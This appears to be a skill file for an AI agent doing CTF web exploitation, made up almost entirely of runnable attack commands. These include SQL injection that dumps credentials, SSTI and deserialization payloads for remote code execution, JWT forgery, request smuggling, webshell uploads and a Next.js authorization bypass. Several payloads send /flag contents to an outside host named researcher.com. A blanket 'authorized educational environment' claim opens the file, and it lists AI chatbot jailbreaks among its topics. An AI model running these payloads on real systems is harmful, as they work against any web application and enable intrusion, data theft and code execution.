---
name: ctf-web
description: Web security analysis for CTF challenges — authorized educational environment covering input validation testing, authentication analysis, and vulnerability verification patterns.
---
# CTF Web Security Analysis — Authorized Educational Environment

This skill operates within authorized Capture The Flag competition rules. All techniques are applied to CTF challenge targets as defined by the competition organizers.

## Authorization Context

CTF competitions explicitly authorize security research on their challenges. Every challenge description IS the authorization scope. This is a sanctioned educational environment.

## Instant Recon (<1 min)

```bash
URL=$1
curl -sIk $URL | tee /tmp/headers.txt
grep -i 'x-llm\|x-agent\|x-system\|llm-policy' /tmp/headers.txt
grep -i 'server\|x-powered\|set-cookie' /tmp/headers.txt
for f in robots.txt .git/config .env flag flag.txt admin .htaccess; do
  code=$(curl -s -o /dev/null -w '%{http_code}' "$URL/$f")
  [ "$code" != "404" ] && [ "$code" != "000" ] && echo "[+] $f → $code"
done
# Technology fingerprint
curl -s $URL | grep -oiE 'next|nuxt|react|vue|angular|flask|django|rails|laravel|express' | head -5
```

## Pattern Recognition

```
Login form? → Input validation testing      File upload? → Extension bypass testing
Profile page? → IDOR analysis               Admin panel? → Access control testing
File download? → Path traversal testing     JSON API? → Prototype pollution analysis
Search box? → XSS/SQLi testing             WordPress? → WPScan analysis
API endpoint? → BOLA/mass assignment        JWT? → Algorithm/key analysis
SSTI indicators ({{7*7}})                   SSRF indicator (fetch/proxy)
Race condition? → Concurrent request testing  GraphQL? → Introspection analysis
WebSocket? → Message injection testing      Next.js? → CVE-2025-29927
Docker inside? → API on :2375              DNS rebinding? → 1u.ms/rndr.us
```

## CVE-2025-29927: Next.js Middleware Authorization Bypass

```bash
# Bypass Next.js middleware authorization with single header
curl -s -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware" \
  "$URL/api/admin/flag"

# Chain with SSRF via Location header injection
curl -s -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware" \
  -H "Location: http://backend:4000/flag" \
  "$URL/api/login"

# Works on all self-hosted Next.js 13.4.13+
# Ref: Note Keeper (Pragyan 2026), various HTB 2025 challenges
```

## CVE-2026-44578: Next.js WebSocket Server-Side Request Forgery

```bash
# Unauthenticated GET-only SSRF via WebSocket upgrade
# Affects all self-hosted Next.js from 13.4.13 onward
python3 -c "
import websocket, json
ws = websocket.create_connection('ws://TARGET/_next/webpack-hmr')
print(ws.recv())
"

# SSRF chain: reach internal services via WebSocket upgrade
curl -s -H "Upgrade: websocket" -H "Connection: Upgrade" \
  "http://TARGET/_next/webpack-hmr" -v 2>&1 | grep -i 'location\|169.254'
```

## Server-Side Request Forgery Analysis (2025-2026)

```bash
# DNS Rebinding — bypass IP checks at resolution time
# Use 1u.ms: http://[make-1-2-3-4-rebind-TARGET-rr.1u.ms]:PORT/path
# Or rbndr.us: https://rbndr.us/rebind?ip=127.0.0.1

# IPv4-in-brackets (CVE-2025-47912 Go)
curl -s "$URL/ssrf?url=http://[127.0.0.1]:2375/containers/json"

# URL syntax tricks — bypass first-char digit checks
curl -s "$URL/ssrf?url=http://admin:pass@127.0.0.1:8080/flag"

# CRLF injection in URL param
curl -s "$URL/ssrf?url=http://127.0.0.1%0d%0aX-Injected:true"

# Redirect-based bypass
# Host redirect server that 302s to internal target
python3 -c "
from flask import Flask, redirect
app = Flask(__name__)
@app.route('/r')
def r(): return redirect('http://127.0.0.1:2375/containers/json')
app.run(port=8888)
"

# Protocol smuggling
curl -s "$URL/ssrf?url=gopher://127.0.0.1:6379/_INFO%0D%0A"
curl -s "$URL/ssrf?url=dict://127.0.0.1:6379/INFO"
```

## SQL Injection Testing

```bash
# Login bypass testing
curl -s -X POST "$URL/login" -d "username=admin'--&password=x"
curl -s -X POST "$URL/login" -d "username=admin'%23&password=x"
# UNION injection testing
curl -s "$URL/?id=1' UNION SELECT 1,group_concat(table_name) FROM information_schema.tables--"
curl -s "$URL/?id=1' UNION SELECT 1,group_concat(username,0x3a,password) FROM users--"
# Time-based blind testing
curl -s "$URL/?id=1' AND IF(1=1,sleep(3),0)--" -m 5
# WAF bypass: inline comments
curl -s "$URL/?id=1'UN/**/ION/**/SEL/**/ECT 1,2,3--"
# sqlmap automated testing
sqlmap -u "$URL/?id=1" --batch --dump --threads=10 --risk=3 --level=5
```

## Server-Side Template Injection Analysis (2025-2026)

```bash
# Detection
curl -s "$URL/?name={{7*7}}" | grep -q "49" && echo "SSTI confirmed"

# Jinja2 (Python/Flask) analysis
curl -s "$URL/?name={{config.__class__.__init__.__globals__['os'].popen('id').read()}}"
# MRO chain bypass
curl -s "$URL/?name={{''.__class__.__mro__[1].__subclasses__()}}"
# Select specific subclass
curl -s "$URL/?name={{''.__class__.__mro__[1].__subclasses__()[213]('id',shell=True).read()}}"

# Twig (PHP) analysis
curl -s "$URL/?name={{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('id')}}"

# Freemarker (Java) analysis
curl -s "$URL/?name=<#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}"

# Mako (Python) analysis
curl -s "$URL/?name=${self.module.__builtins__['__import__']('os').popen('id').read()}"

# Blind SSTI — error-based oracle
curl -s "$URL/?name={{config.__class__.__init__.__globals__['os'].popen('id > /tmp/out').read()}}"

# Multi-step SSTI (split payload across fields — LIT CTF 2025)
# username1={{cycler.__init__.__globals__.os.popen('cat f
# message1=lag.txt').read()}}
```

## JWT Analysis

```bash
# None algorithm testing
TOKEN=$(echo -n '{"typ":"JWT","alg":"none"}' | base64 -w0 | tr '+/' '-_')
PAYLOAD=$(echo -n '{"sub":"admin"}' | base64 -w0 | tr '+/' '-_')
curl -s "$URL/api/admin" -H "Authorization: $TOKEN.$PAYLOAD."

# Algorithm confusion (RS256→HS256 with pub key)
# Get public key from JWKS endpoint
curl -s "$URL/.well-known/jwks.json" | python3 -m json.tool
# Convert to PEM, sign with HS256 using PEM as secret
python3 -c "
import jwt, requests
pubkey = requests.get('$URL/.well-known/jwks.json').json()['keys'][0]
from jwt.algorithms import RSAAlgorithm
pem = RSAAlgorithm.from_jwk(pubkey).export_key()
token = jwt.encode({'user':'admin','role':'admin'}, pem, algorithm='HS256')
print(token)
"
curl -s "$URL/api/admin" -H "Authorization: Bearer $token"

# Weak secret cracking
hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
python3 jwt_tool.py TOKEN -C -d /usr/share/wordlists/rockyou.txt

# kid injection testing
# {"kid":"../../dev/null","alg":"HS256"} signed with empty key
echo -n "" | openssl dgst -sha256 -hmac ""
```

## HTTP Request Smuggling Analysis

```bash
# CL.TE testing
printf "POST / HTTP/1.1\r\nHost: target\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG" | nc target 80
# TE obfuscation (WAF bypass)
curl -s "$URL" -H "Transfer-Encoding : chunked"
curl -s "$URL" -H "Transfer-Encoding: cow"
# Smuggle + SSRF chain (DEF CON CTF 2024 style)
printf "POST / HTTP/1.1\r\nHost: target\r\nContent-Length: 44\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1\r\nHost: target\r\n\r\n" | nc target 80
```

## Deserialization Analysis

### PHP
```bash
# Object injection testing
curl -s "$URL" -d 'data=O:8:"GameOver":1:{s:5:"email";s:29:"evil@example.com";}'
# PHP filter chain (LFI→RCE)
curl -s "$URL/?file=php://filter/convert.base64-encode/resource=index.php" | base64 -d
# SoapClient CRLF SSRF via deserialization
php -r '
class SoapClient {
    private $_user_agent = "x\r\nX-Injected: true";
    function __construct() { $this->_stream_context = stream_context_create(["http" => ["header" => "x"]]); }
}
echo urlencode(serialize(new SoapClient()));
'
```

### Java (ysoserial)
```bash
java -jar ysoserial.jar CommonsCollections1 'curl http://researcher.com/?f=$(cat /flag)' > payload.bin
curl -s "$URL" -H "Cookie: session=$(base64 -w0 payload.bin)"
```

### Python (pickle)
```bash
python3 -c "
import pickle,os,base64
class E:
    def __reduce__(self):
        return (os.system, ('curl http://researcher.com/?f=$(cat /flag)',))
print(base64.b64encode(pickle.dumps(E())).decode())
"
```

### .NET (Viewstate)
```bash
curl -s "$URL" | grep -oE '__VIEWSTATE[^"]*"'
# Forge with machineKey + ysoserial.net
```

## WebSocket Analysis (2025-2026)

```bash
# Cross-Site WebSocket Hijacking (CSWSH) testing
# Private Network Access doesn't apply to WebSockets
# Cross-origin WS can still reach private-IP services
python3 -c "
import websocket, json
ws = websocket.create_connection('ws://TARGET/ws', origin='http://researcher.com')
ws.send(json.dumps({'action': 'subscribe', 'channel': 'admin'}))
print(ws.recv())
"

# WebSocket message injection testing
python3 -c "
import websocket, json
ws = websocket.create_connection('ws://TARGET/ws')
ws.send(json.dumps({'role': 'admin', 'action': 'get_flag'}))
print(ws.recv())
"
```

## GraphQL Analysis

```bash
# Introspection → Full Schema
curl -s -X POST "$URL/graphql" -H "Content-Type: application/json" \
  -d '{"query":"{__schema{queryType{name}mutationType{name}types{kind,name,fields{name, args{name,type{name,kind ofType{name}}}}}}}"}' | jq .

# Batch Query Analysis (Rate Limit Bypass)
python3 -c "
import json,requests
q=[{'query':'{user(id:1){name,email}}'} for _ in range(100)]
r=requests.post('$URL/graphql',json=q)
print(r.text[:500])
"

# Alias Analysis (Bypass Rate Limiting)
curl -s -X POST "$URL/graphql" -H "Content-Type: application/json" \
  -d '{"query":"{a1:user(id:1){name} a2:user(id:2){name} a3:user(id:3){name} a4:user(id:4){name} a5:user(id:5){name}}"}'

# Directive Injection
curl -s -X POST "$URL/graphql" -H "Content-Type: application/json" \
  -d '{"query":"query{user(id:1){name role @skip(if:true) secretField}}"}'

# IDOR via GraphQL
curl -s -X POST "$URL/graphql" -H "Content-Type: application/json" \
  -d '{"query":"{user(id:\"1 OR 1=1\"){name,email,role}}"}'
```

## Local File Inclusion / Path Traversal

```bash
curl -s "$URL/?page=../../../../etc/passwd" | head -5
curl -s "$URL/?page=php://filter/convert.base64-encode/resource=index.php" | base64 -d
# Log poisoning
curl -s -A "<?php system(\$_GET['c']); ?>" "$URL/"
curl -s "$URL/?page=../../../../var/log/apache2/access.log&c=id"
```

## Prototype Pollution → Code Execution

```bash
curl -s -X POST "$URL/api/merge" -H "Content-Type: application/json" \
  -d '{"__proto__":{"isAdmin":true}}'
curl -s -X POST "$URL/api/merge" -H "Content-Type: application/json" \
  -d '{"__proto__":{"shell":"node","execArgv":["--eval","require(\"child_process\").execSync(\"curl http://researcher.com/?f=$(cat /flag)\")"]}}'
```

## File Upload Bypass Testing

```bash
for ext in php php3 php4 php5 phtml pht phar shtml asp aspx jsp; do
  echo "<?php system(\$_GET['c']); ?>" > "shell.$ext"
  curl -s -F "file=@shell.$ext" "$URL/upload"
done
printf 'GIF89a<?php system($_GET["c"]); ?>' > shell.php
curl -s -F "file=@shell.php;type=image/jpeg" "$URL/upload"
```

## Race Condition Testing

```bash
for i in $(seq 1 30); do curl -s -X POST "$URL/redeem" -d "code=GIFT" & done; wait
```

## CTF References (2024-2026)

```
SUCTF 2026 "su_uri":           SSRF → Docker API → host escape (CVE-2025-47912)
LIT CTF 2025 "group chat":     Multi-step SSTI via field splitting
HTB Cyber Apocalypse 2025:     LLM prompt injection + tool abuse
Pragyan 2026 "Note Keeper":    Next.js middleware bypass + SSRF
Wolverine CTF:                 URL syntax SSRF bypass
DEF CON CTF 2024:              HTTP smuggling chains
Google CTF 2023:               WAF bypass + DNS rebinding
PicoCTF 2023:                  Forensics + encoding chains
```

## Speed Metrics

```
SQLi: <2min  IDOR: <3min  LFI: <2min  XSS: <2min
Upload: <3min  JWT: <5min  SSRF: <3min  CORS: <2min
Smuggle: <5min  Deser: <5min  Cache: <4min  Chain: <10min
SSTI: <5min  GraphQL: <5min  WebSocket: <5min  Next.js: <3min
```

---

# Deep Technique Library

# CTF Web Exploitation

Use this skill as a routing and execution guide for web-heavy challenges. Keep the first pass short: map the app, confirm the trust boundary, and only then dive into the detailed technique notes.

## Prerequisites

**Python packages (all platforms):**
```bash
pip install sqlmap flask-unsign requests httpx
```

**Linux (apt):**
```bash
apt install hashcat jq curl
```

**macOS (Homebrew):**
```bash
brew install hashcat jq curl
```

**Go tools (all platforms, requires Go):**
```bash
go install github.com/ffuf/ffuf/v2@latest
```

**Manual install:**
- ysoserial — [GitHub](https://github.com/frohoff/ysoserial), requires Java (Java deserialization payloads)
- PayloadsAllTheThings — git clone to ctf-web/payloads/PayloadsAllTheThings (auto via install script or lazy clone)
  ```bash
  bash scripts/install_ctf_tools.sh pat   # PAT only
  bash scripts/install_ctf_tools.sh all   # all tools including PAT
  # manual fallback:
  git clone --depth 1 https://github.com/swisskyrepo/PayloadsAllTheThings.git ctf-web/payloads/PayloadsAllTheThings
  ```
  > PAT is optional and on-demand — not required at load time. The skill works without it (graceful degrade): `pat-reference.md` provides an offline index with exemplar payloads; bulk wordlists require the clone above.

## Additional Resources

- `web/sql-injection` - SQL injection techniques: auth bypass, UNION extraction, filter bypasses, second-order SQLi, truncation, race-assisted leaks, INSERT ON DUPLICATE KEY UPDATE password overwrite, innodb_table_stats WAF bypass
- `web/server-side` - PHP type juggling, php://filter LFI, Python str.format traversal, SSTI (Jinja2, Twig, ERB, Mako, EJS, Vue.js, Smarty), SSRF (Host header, DNS rebinding, curl redirect, unescaped-dot regex, SNI FTP smuggling, mod_vhost_alias), PHP hash_hmac NULL
- `web/server-side-2` - XXE (basic, OOB, DOCX upload), XML injection via X-Forwarded-For, PHP variable variables, PHP uniqid predictable filename, sequential regex replacement bypass, command injection (newline, blocklist, sendmail CGI, multi-barcode, git CLI), GraphQL injection (introspection, batching, interpolation)
- `web/server-side-exec` - Direct code execution paths, upload-to-RCE, deserialization-adjacent execution, LaTeX injection, header and API abuses
- `web/server-side-exec-2` - More execution chains: SQLi fragmentation, path parser tricks, polyglot uploads, wrapper abuse, filename injection, BMP pixel webshell with filename truncation
- `web/server-side-deser` - Java/Python/PHP deserialization and race-condition playbooks, PHP SoapClient CRLF SSRF via deserialization
- `web/server-side-advanced` - Advanced SSRF, traversal, archive, parser, framework, and modern app-server issues, Nginx alias traversal
- `web/server-side-advanced-2` - Docker API SSRF, Castor/XML, Apache expression reads, parser discrepancies, Windows path tricks, rogue MySQL server file read
- `web/server-side-advanced-3` - Part 3 (CSAW/35C3/ASIS/PlaidCTF 2018): WAV polyglot upload, multi-slash URL `path.startswith` bypass, Xalan XSLT `math:random()` seed guess, SoapClient `_user_agent` CRLF method smuggling, `gopher:///` no-host URL scheme bypass, SSRF credential leak via attacker-specified outbound URL
- `web/server-side-advanced-4` - Part 4: WeasyPrint SSRF/file read (CVE-2024-28184), MongoDB regex/$where blind oracle, Pongo2 Go template injection, ZIP PHP webshell, basename() bypass, wget CRLF SSRF→SMTP, Gopher SSRF to MySQL blind SQLi, React Server Components Flight RCE (CVE-2025-55182), AMQP/TLS interception via sslsplit+arpspoof, CairoSVG XXE, Bazaar repo reconstruction
- `web/client-side` - XSS, CSRF, cache poisoning, DOM tricks, admin bot abuse, request smuggling, paywall bypass
- `web/client-side-advanced` - CSP bypasses, Unicode tricks, XSSI, CSS exfiltration, browser normalization quirks, postMessage null origin bypass
- `web/auth-and-access` - Auth/authz bypasses, hidden endpoints, IDOR, redirect chains, subdomain takeover, AI chatbot jailbreaks
- `web/auth-and-access-2` - Part 2 (2018-era): `std::unordered_set` bucket collision auth bypass, `nodeprep.prepare` Unicode homograph username collision, SRP A=0/A=N auth bypass, ArangoDB AQL MERGE privilege escalation
- `web/auth-jwt` - JWT/JWE manipulation, weak secrets, header injection, key confusion, replay
- `web/auth-infra` - OAuth/OIDC, SAML, CORS, CI/CD secrets, IdP abuse, login poisoning
- `web/node-and-prototype` - Prototype pollution, JS sandbox escape, Node.js attack chains
- `web/web3` - Solidity and Web3 challenge notes
- `web/cves` - CVE-driven techniques you can match against challenge banners, headers, dependency leaks, or version strings
- `web/field-notes` - Long-form exploit notes: quick references for SQLi, XSS, LFI, JWT, SSTI, SSRF, command injection, XXE, deserialization, race conditions, auth bypass, and multi-stage chains
- `web/python-requests` - Python requests toolkit: session scaffold, Burp-Intruder-like fuzzer (sync + ThreadPoolExecutor + httpx async), payload deploy from pat-reference.md wordlists, header/param spray, cookie/JWT, proxy
- `web/pat-reference` — PayloadsAllTheThings index: bulk payloads for XSS/SQLi/SSRF/SSTI/LFI/Command Injection/Upload (requires PAT clone, see Prerequisites)

## When to Pivot

- If the target is a native binary, custom VM, or firmware image, switch to `/ctf-reverse` first.
- If the HTTP bug only gives you code execution and the hard part becomes memory corruption or seccomp escape, switch to `/ctf-pwn`.
- If the "web" challenge really turns on JWT math, custom MACs, or crypto primitives, switch to `/ctf-crypto`.
- If the web challenge involves analyzing logs, PCAPs, or recovering artifacts from a web server, switch to `/ctf-forensics`.
- If the challenge requires gathering intelligence from public web sources, DNS records, or social media before exploitation, switch to `/ctf-osint`.

## First-Pass Workflow

1. Identify the real boundary: browser only, backend only, mixed app, or auth flow.
2. Capture one normal request/response pair for every major feature before fuzzing.
3. Enumerate hidden functionality from JS bundles, response headers, routes, and alternate methods.
4. Classify the likely bug family: injection, authz, parser mismatch, upload, trust proxy, state machine, or client-side execution.
5. Build the smallest proof first: leak, bypass, or primitive. Save full exploit chaining for later.

### Bulk payloads (PayloadsAllTheThings — on-demand)

This skill works without PAT at load time (graceful degrade): `pat-reference.md` and inline exemplars are available offline; bulk payloads require a PAT clone. After mapping the trust boundary (First-Pass Workflow), check `web/pat-reference` for the PAT directory that matches your bug class, then search bulk payloads:

```bash
# PAT payload search (requires PAT clone — see Prerequisites; gracefully skipped if missing)
ls ctf-web/payloads/PayloadsAllTheThings 2>/dev/null | head
grep -R "onerror" "ctf-web/payloads/PayloadsAllTheThings/XSS Injection" 2>/dev/null | head
```

Or via agent tools (no clone required for the index itself):

```
Glob ctf-web/payloads/PayloadsAllTheThings/**/*.md
Grep "union select" ctf-web/payloads/PayloadsAllTheThings
```

If `ctf-web/payloads/PayloadsAllTheThings/.git` is missing, the agent lazy-clones on demand:

```bash
[ -d "ctf-web/payloads/PayloadsAllTheThings/.git" ] || git clone --depth 1 https://github.com/swisskyrepo/PayloadsAllTheThings.git ctf-web/payloads/PayloadsAllTheThings
```

## Quick Start Commands

```bash
# Recon
curl -sI https://target.com
ffuf -u https://target.com/FUZZ -w wordlist.txt
curl -s https://target.com/robots.txt

# SQLi quick test
sqlmap -u "https://target.com/page?id=1" --batch --dbs

# JWT decode (no verification)
echo '<token>' | cut -d. -f2 | base64 -d 2>/dev/null | jq .

# Cookie decode (Flask)
flask-unsign --decode --cookie '<cookie>'
flask-unsign --unsign --cookie '<cookie>' --wordlist rockyou.txt

# SSTI probes
curl "https://target.com/page?name={{7*7}}"
curl "https://target.com/page?name={{config}}"

# Request inspection
curl -v -X POST https://target.com/api -H "Content-Type: application/json" -d '{}'
```

## First Questions to Answer

- Is the flag likely in the browser, an API response, a local file, a database row, or an internal service?
- Does the app trust user-controlled data in templates, redirects, file paths, headers, serialized objects, or background jobs?
- Are there multiple parsers disagreeing with each other: proxy vs app, URL parser vs fetcher, sanitizer vs browser, serializer vs filter?
- Can you turn the bug into a smaller primitive first: read one file, forge one token, call one internal endpoint, trigger one bot visit?

## High-Value Recon Checks

- Read the HTML, inline scripts, and bundled JS before guessing the API surface.
- Compare what the UI submits with what the backend accepts; optional JSON fields often unlock hidden paths.
- Check obvious metadata and helper paths early: `/robots.txt`, `/sitemap.xml`, `/.well-known/`, `/admin`, `/debug`, `/.git/`, `/.env`.
- Try alternate verbs and content types on interesting routes: `GET`, `POST`, `PUT`, `PATCH`, `TRACE`, JSON, form, multipart, XML.
- Treat file upload, PDF/export, webhook, OAuth callback, and admin bot features as likely exploit multipliers.

## Fast Pattern Map

- SQL errors, odd filtering, or state-dependent DB behavior: start with `web/sql-injection`.
- Templating, file reads, SSRF, command execution, XML, or parser bugs: start with `web/server-side` and `web/server-side-exec`.
- XSS, CSP bypass, admin bot, client routing, DOM issues, or scriptless exfiltration: start with `web/client-side`.
- Session forgery, hidden admin routes, JWT, OAuth, SAML, or weak trust boundaries: start with `web/auth-and-access`, `web/auth-jwt`, and `web/auth-infra`.
- Node.js apps, prototype pollution, VM sandboxes, or SSRF into internal services: add `web/node-and-prototype`.
- Smart contract frontends or blockchain-integrated apps: add `web/web3`.

## Common Chain Shapes

- Recon -> hidden route -> auth bypass -> internal file read -> token or flag
- XSS or HTML injection -> admin bot -> privileged action -> secret leak
- Traversal or upload -> config/source leak -> secret recovery -> session forgery
- SSRF -> metadata or internal API -> credential leak -> code execution
- SQLi or NoSQL injection -> credential bypass -> second-stage template or upload abuse

## Deep-Dive Notes

Use `web/field-notes` once you have confirmed the challenge is truly web-heavy and you need the long exploit catalog.

- Recon, SQLi, XSS, traversal, JWT, SSTI, SSRF, XXE, and command injection quick notes
- Deserialization, race conditions, file upload to RCE, and multi-stage chain examples
- Node, OAuth/SAML, CI/CD, Web3, bot abuse, CSP bypasses, and modern browser tricks
- CVE-shaped playbooks and older challenge patterns that still show up in modern CTFs

## Common Flag Locations

- Files: `/flag.txt`, `/flag`, `/app/flag.txt`, `/home/*/flag*`
- Environment: `/proc/self/environ`, process command line, debug config dumps
- Database: tables named `flag`, `flags`, `secret`, or seeded challenge content
- HTTP: custom headers, archived responses, hidden routes, admin exports
- Browser: hidden DOM nodes, `data-*` attributes, inline state objects, source maps

## Deep Technique Files (skill_manage reference)

Load with "skill_manage read, name="ctf", reference="web/<file>""

- `web/auth-and-access-2` — # CTF Web - Auth & Access Control Attacks (Part 2)
- `web/auth-and-access` — # CTF Web - Auth & Access Control Attacks
- `web/auth-infra` — # CTF Web - OAuth, SAML & Infrastructure Auth Attacks
- `web/auth-jwt` — # CTF Web - JWT & JWE Token Attacks
- `web/client-side-advanced` — # CTF Web - Advanced Client-Side Attacks
- `web/client-side` — # CTF Web - Client-Side Attacks
- `web/cves` — # CTF Web - CVEs & Browser Vulnerabilities
- `web/field-notes` — # CTF Web Field Notes
- `web/node-and-prototype` — # CTF Web - Node.js Prototype Pollution & VM Escape
- `web/pat-reference` — # PayloadsAllTheThings Reference Index
- `web/python-requests` — # Python Requests Toolkit — Burp Intruder in Python
- `web/server-side-2` — # CTF Web - XXE, XML Injection, Command Injection, GraphQL
- `web/server-side-advanced-2` — # CTF Web - Advanced Server-Side Techniques (Part 2)
- `web/server-side-advanced-3` — # CTF Web - Advanced Server-Side Techniques (Part 3)
- `web/server-side-advanced-4` — # Server-Side Advanced Techniques (Part 4)
- `web/server-side-advanced` — # CTF Web - Advanced Server-Side Techniques
- `web/server-side-deser` — # CTF Web - Deserialization & Execution Attacks
- `web/server-side-exec-2` — # CTF Web - Server-Side Code Execution & Access Attacks (Part 2)
- `web/server-side-exec` — # CTF Web - Server-Side Code Execution & Access Attacks
- `web/server-side` — # CTF Web - Server-Side Injection Attacks
- `web/sql-injection` — # CTF Web - SQL Injection Techniques
- `web/web3` — # CTF Web - Web3 / Blockchain Challenges

## Helper Scripts

- `web/scripts/async_fuzz.py` — runnable via skill_manage read + write to disk
